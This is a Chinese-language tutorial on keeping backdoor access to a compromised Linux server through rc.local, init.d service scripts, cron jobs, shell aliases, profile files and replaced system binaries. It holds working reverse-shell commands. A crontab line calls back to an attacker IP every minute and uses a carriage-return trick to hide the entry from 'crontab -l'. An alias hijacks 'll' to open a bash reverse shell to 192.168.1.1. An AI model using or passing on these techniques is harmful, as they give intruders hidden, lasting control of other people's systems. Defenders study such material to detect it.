开机自启动

在linux系统中，也有开机自启文件/etc/rc.local

当服务器开机时，将执行自启文件当中的命令
可以将反弹shell或运行后门命令写入该文件当中

启动服务执行

在/etc/init.d/目录下存放着全部的服务项启动脚本
当服务重启或者停止时就会运行该脚本中的代码，我们可以修改此目录下的服务项，写入后门程序

比如新建一个服务脚本tomcat
vim /etc/init.d/tomcatcase "$1" instart)echo "starting"/home/tomcat/bin/startup.sh &;;stop)echo "stop"/home/tomcat/bin/shutdown.sh;;esac
给相应的执行权限，并添加到开机自启中
chmod +x tomcat                       chkconfig --add tomcat
 直接执行此服务也可
service tomcat startservice tomcat stop


计划任务

linux中crond是计划任务，和win系统一样可以特定时间特定方式执行我们所需要的命令
crontab -e 编辑当前用户的计划任务crontab -l 查看当前用户的计划任务crontab -l -u username 查看指定用户计划任务crontab -r -u username 删除指定用户计划任务
上面命令最终结果是编辑/var/spool/cron/usename文件
(root权限)可以直接编辑/etc/crontab
vim /etc/crontab

Crontab定时反弹shell
(crontab -l;printf "*/1 * * * * exec 9<> /dev/tcp/攻击者IP/8888;exec 0<&9;exec 1="">&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -

文件别名

可以通过更改别名的方式，猜几个可能触发的别名添加进去
增加临时的：运行ll触发bash反弹
alias ll = “bash -i >& /dev/tcp/192.168.1.1/6666 0>&1”
也可修改配置文件~/.bashrc文件增加永久别名


环境变量

系统环境变量是随用户登录自动执行的。
linux有几个环境变量文件，加载方式各不同

/etc/profile
此文件是所以用户的环境变量，当用户第一次登录时，该文件会被执行
并从/etc/porfile.d/目录下的配置文件中搜集shell设置
~/.bash_profile
每个用户专属的环境变量，当用户登录时，该文件只执行一次！！
~/.bashrc
每个用户专属的环境变量，当用户登录或打开新的shell时，该文件将被读取
~/.bash_logout
退出系统执行该文件内的命令


文件替换

用后门程序替换系统命令
一般替换些常用程序：ls，ps，losf，netstsat等
替换/user/bin/下的命令，可通过which 命令查找某程序所在路径，切过去替换即可
